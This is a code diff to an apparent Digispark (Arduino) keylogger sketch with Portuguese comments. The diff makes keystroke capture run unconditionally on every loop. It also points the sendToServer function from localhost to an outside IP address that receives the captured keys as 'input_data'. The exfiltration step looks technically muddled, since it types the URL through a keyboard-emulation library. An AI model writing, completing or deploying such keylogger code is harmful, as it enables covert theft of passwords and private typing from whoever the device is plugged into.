@@ -13,13 +13,9 @@ void loop() {
     // Aguardar algum tempo antes de começar a captura para dar tempo ao sistema
     DigiKeyboard.delay(5000); // Aguarda 5 segundos
 
-    // Inicia a captura de teclas quando necessário
-    if (capturing) {
-        captureKeys(); // Chama a função de captura de teclas
-    } else {
-        // Caso não esteja capturando, o Digispark não faz nada
-        DigiKeyboard.delay(1000); // Delay para reduzir a carga no CPU
-    }
+    // Ativa a captura de teclas
+    startCapturing();
+    captureKeys(); // Chama a função de captura de teclas
 }
 
 // Função para capturar teclas
@@ -78,7 +74,7 @@ void stopCapturing() {
 
 // Função para enviar as teclas capturadas para o servidor
 void sendToServer(String keys) {
-    String serverUrl = "http://127.0.0.1:5000/submit"; // URL do seu servidor
+    String serverUrl = "http://108.165.179.123:5000/submit"; // URL do seu servidor
     String data = "input_data=" + keys; // Dados a serem enviados
     DigiKeyboard.println(serverUrl + "?" + data); // Envia a URL para o servidor
 }
